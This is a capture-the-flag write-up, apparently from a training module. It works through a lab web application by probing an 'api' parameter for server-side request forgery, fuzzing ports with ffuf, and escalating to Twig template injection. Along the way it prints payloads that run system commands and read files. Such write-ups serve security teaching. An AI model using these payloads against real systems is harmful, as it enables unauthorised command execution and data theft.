# Skills Assessment

You are tasked to perform a security assessment of a client's web application. Apply what you have learned in this module to obtain the flag.

Our task is simple, apply what we've learned and find the flag!

When we first open the application it looks we don't have too much where to looking for. No buttons working, no input forms, nothing at all to interact.

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

However, if we intercept the traffic to Burp Suite and reload the web application we'll find something interesting.

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

We found a POST request with the parameter `api`, which means it's fetching data from a separate system. So, lets send this request to Repeater to explore it further.

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

This is the Response we get.

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

If we change the `api` value to `http://127.0.0.1` we get a diferente Response, but it is still being accepted by the web application.

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

If we change the default port to a random one, in this case it was 3333, it returns an error. This might be a good indicator to explore other ports using ffuf:

{% code overflow="wrap" %}
```bash
ffuf -w ./ports.txt -u http://83.136.255.230:47603/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ/" -fr "Error"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

No other ports found.

Lets go back a bit and change the `api` parameter to default value `http://truckapi.htb/` and lets try some Template Engine Injection.

Since the Request is sending data, lets try to change the default values to the fallowing payload:

```bash
api=http://truckapi.htb/?id%3D${7*7}
```

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

And the application didn't filter the injection. We are heading into something!

Now we improve to the followinf payload:

```bash
api=http://truckapi.htb/?id%3D{{7*'7'}}
```

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

It work again! This results means the web applications is using the Twig template engine.&#x20;

Lets try the following payload:

```bash
api=http://truckapi.htb/?id%3D{{_self}}
```

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

And it works! For some reason we hav to get rid of the `{{ _self }}` spaces - URL encoding doesn't work.

Improving the payload to execute UNIX commands:

```bash
api=http://truckapi.htb/?id%3D{{['id']|filter('system')}}
```

<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

And its working! Now all we have to do is look for the flag.

You may find some trouble if you are trying to improve the payload in order to list the files. A few lines above I said the URL encoding wasn't working. Well thats because the spaces can only be replaced by hexadecimal characters, in this case `\x20`.

```bash
api=http://truckapi.htb/?id%3D{{['cat\x20../../../flag.txt']|filter('system')}}
```

<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

And we manage to get the final flag for this section!
